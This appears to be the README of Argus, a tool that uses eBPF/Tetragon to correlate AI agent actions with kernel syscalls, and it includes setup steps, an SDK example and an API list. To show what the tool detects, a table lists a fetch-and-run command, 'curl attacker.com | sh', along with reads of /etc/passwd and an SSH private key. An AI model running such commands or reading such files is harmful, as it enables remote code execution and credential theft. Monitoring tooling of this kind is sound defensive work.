# Argus

**AI Agent Runtime Governance & Observability Platform**

Argus answers the question: *"What is my AI agent actually doing at the OS level?"*

When an AI agent says it called an API, Argus shows you the 25 kernel-level syscalls that happened — the TCP connections, file descriptors, DNS lookups, and child processes. It correlates high-level agent actions with low-level eBPF traces, giving you a complete picture of agent behavior that no application-level logging can provide.

## Why Argus?

AI agents are increasingly autonomous — they read files, make network requests, spawn processes, and execute tools. Application logs show what the agent *intended* to do. Argus shows what it *actually* did.

| What you see today | What Argus shows you |
|---|---|
| "Agent called OpenAI API" | `tcp_connect → 52.6.31.42:443`, `tcp_sendmsg × 3`, `fd_install × 8` |
| "Agent read config file" | `fd_install /etc/passwd`, `fd_install /home/user/.ssh/id_rsa` |
| "Agent ran a tool" | `execve /bin/sh -c "curl attacker.com \| sh"` |
| "Agent completed task" | 347 syscalls across 12 seconds, 4 network destinations, 2 child processes |

This matters for:
- **Security teams** — detect when agents access files or endpoints they shouldn't
- **Compliance** — prove exactly what an agent did during an audit
- **Debugging** — understand why an agent is slow (DNS timeout? connection refused? disk I/O?)
- **Trust** — build confidence that autonomous agents behave as expected

## How It Works

```
Your AI Agent                          Argus
─────────────                          ─────
                                       ┌──────────────────────┐
 ┌───────────┐   Argus SDK reports     │  Argus API           │
 │ LLM Call  │──── action lifecycle ──>│  (sessions, actions) │
 │ Tool Use  │   (what it intended)    └──────────┬───────────┘
 │ File I/O  │                                    │
 └─────┬─────┘                                    │ Correlator joins
       │ OS-level syscalls                        │ by pod_name +
       ▼                                          │ time window
 ┌──────────────────────┐                         │
 │ Tetragon (eBPF)      │   gRPC stream     ┌────▼───────────────┐
 │ Kernel-level capture  │──── of events ──> │ Argus Ingestion    │
 │ with K8s pod metadata │  (what it did)    │ (stores in PG)     │
 └──────────────────────┘                    └────────────────────┘
                                                   │
                                             ┌─────▼─────────────┐
                                             │ Argus Dashboard    │
                                             │ Timeline view:     │
                                             │ action → syscalls  │
                                             └───────────────────┘
```

**The key insight:** Tetragon captures syscalls at the kernel level and tags each one with the Kubernetes pod name. The Argus SDK reports which pod the agent runs in. The correlator joins them: *"This agent action, in this pod, during this time window, produced these kernel events."*

## Instrumenting Your Agent

Add the Argus Python SDK to your agent (single file, zero dependencies):

```python
from argus_sdk import ArgusSession

# Start a session — tells Argus "this agent is running in this pod"
session = ArgusSession("my-agent", api_url="http://argus-api:3001")
session.start()

# Wrap each meaningful operation in an action
with session.action("llm_call", "openai.chat.completions") as act:
    result = openai.chat.completions.create(
        model="gpt-4", messages=[{"role": "user", "content": prompt}]
    )
    act.set_output(str(result.choices[0].message)[:500])

with session.action("tool_use", "read_document") as act:
    content = open("/data/report.pdf", "r").read()
    act.set_output(f"Read {len(content)} bytes")

with session.action("network_request", "post_results") as act:
    requests.post("https://api.example.com/results", json=results)
    act.set_output("Posted results")

session.end()
```

When the action ends, Argus automatically correlates it with the kernel events Tetragon captured during that time window. The dashboard shows a timeline like:

```
▶ llm_call / openai.chat.completions           1.2s   25 events
    tcp_connect  → 52.6.31.42:443               ● confidence: 1.0
    tcp_sendmsg  (3.2KB)                         ● confidence: 1.0
    fd_install   (8 file descriptors)            ● confidence: 1.0

▶ tool_use / read_document                      0.03s  14 events
    fd_install   /data/report.pdf                ● confidence: 1.0
    sys_write    (wrote 4.1KB)                   ● confidence: 1.0

▶ network_request / post_results                0.8s   18 events
    tcp_connect  → 93.184.216.34:443             ● confidence: 1.0
    tcp_sendmsg  (1.8KB)                         ● confidence: 1.0
```

## Quick Start

### Prerequisites
- Docker Desktop
- Node.js 20+
- pnpm (`npm install -g pnpm`)

### Option A: Docker Compose (simplest)

```bash
git clone https://github.com/Ditou007/argus.git && cd argus
pnpm install

# Start infrastructure
docker compose up -d

# Start services (3 terminals)
pnpm dev:ingestion    # Tetragon event consumer
pnpm dev:api          # REST API on :3001
pnpm dev:dashboard    # Dashboard on :3000

# Run the demo agent (in the Tetragon container)
docker compose --profile agent run --rm sample-agent
```

Open http://localhost:3000 — you'll see kernel events flowing in real-time and agent sessions in the Sessions tab.

> **Note:** Docker Compose mode uses PID-based correlation which has limitations with container PID namespaces. For full pod-based correlation, use Kubernetes mode.

### Option B: Local Kubernetes (full correlation)

Requires `kind` and `helm` (`brew install kind helm`).

```bash
git clone https://github.com/Ditou007/argus.git && cd argus
pnpm install

# One command: creates Kind cluster, deploys Tetragon + Postgres + Redis + Argus
pnpm k8s:setup

# Expose API to your host (separate terminal)
pnpm k8s:port-forward

# Start dashboard (separate terminal)
pnpm dev:dashboard

# Run the instrumented agent
pnpm k8s:agent
```

Open http://localhost:3000 → Sessions tab → click the latest session to see the full correlated timeline.

```bash
# Useful commands
pnpm k8s:logs:ingestion    # Watch event ingestion
pnpm k8s:logs:api          # Watch API logs
pnpm k8s:logs:tetragon     # Watch Tetragon
./k8s/rebuild.sh api       # Rebuild after code changes
pnpm k8s:teardown          # Delete the cluster
```

## Architecture

### Project Structure

```
argus/
├── packages/
│   ├── ingestion/          # Tetragon event consumer (file-tailing + gRPC)
│   ├── api/                # REST API (Express)
│   └── dashboard/          # Web UI (Next.js)
├── sample-agent/
│   ├── argus_sdk.py        # Python SDK for agent instrumentation
│   ├── agent_v2.py         # Demo agent using the SDK
│   └── Dockerfile
├── k8s/                    # Kubernetes manifests
│   ├── setup.sh            # One-command cluster bootstrap
│   ├── teardown.sh         # Cluster cleanup
│   ├── rebuild.sh          # Dev rebuild helper
│   ├── kind-config.yaml    # Kind cluster config
│   ├── tetragon-values.yaml
│   ├── postgres.yaml
│   ├── redis.yaml
│   ├── api.yaml
│   ├── ingestion.yaml
│   ├── sample-agent-job.yaml
│   └── policies/           # Tetragon TracingPolicy CRDs
├── policies/               # Tetragon policies (docker-compose)
├── docker-compose.yml
└── pnpm-workspace.yaml
```

### Tech Stack

| Layer | Technology |
|-------|-----------|
| eBPF Runtime | Cilium Tetragon v1.1.2 |
| Event Pipeline | Node.js + TypeScript |
| API | Express (factory pattern) |
| Database | PostgreSQL 16 |
| Dashboard | Next.js 14 + React 18 |
| K8s (local) | Kind + Helm |
| Agent SDK | Python (zero dependencies) |

### Correlation Strategy

In **Kubernetes mode**, correlation is reliable and straightforward:
1. Tetragon tags every kernel event with the pod name of the process that generated it
2. The Argus SDK reports the pod name when starting a session (via K8s Downward API)
3. When an action ends, the correlator queries: `events WHERE pod_name = X AND event_time BETWEEN start AND end`
4. Nanosecond-precision timestamps from Tetragon protobuf ensure accurate matching

In **Docker Compose mode**, correlation falls back to PID + time window matching, which has limitations with container PID namespaces.

### API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/health` | Health check |
| GET | `/api/events?type=&binary=&limit=&offset=` | List events (paginated, filterable) |
| GET | `/api/events/stats` | Event counts by type |
| POST | `/api/sessions` | Start an agent session |
| GET | `/api/sessions` | List sessions |
| GET | `/api/sessions/:id` | Session detail |
| PATCH | `/api/sessions/:id/end` | End a session |
| POST | `/api/sessions/:id/actions` | Start an action |
| PATCH | `/api/sessions/actions/:id/end` | End action + auto-correlate |
| GET | `/api/sessions/actions/:id/events` | Get correlated events |
| GET | `/api/sessions/:id/timeline` | Full session timeline |
| POST | `/api/sessions/actions/:id/correlate` | Re-correlate (manual) |

## Roadmap

- [x] Month 1: eBPF syscall tracing + event ingestion + live dashboard
- [x] Month 2: Agent correlation (LLM calls ↔ syscall traces) + K8s setup
- [ ] Month 3: Risk scoring + policy enforcement + alerting
- [ ] Month 4: Deterministic replay + RBAC + multi-tenant
- [ ] Month 5: OpenTelemetry integration + benchmarks
- [ ] Month 6: Production polish + documentation

## License

MIT
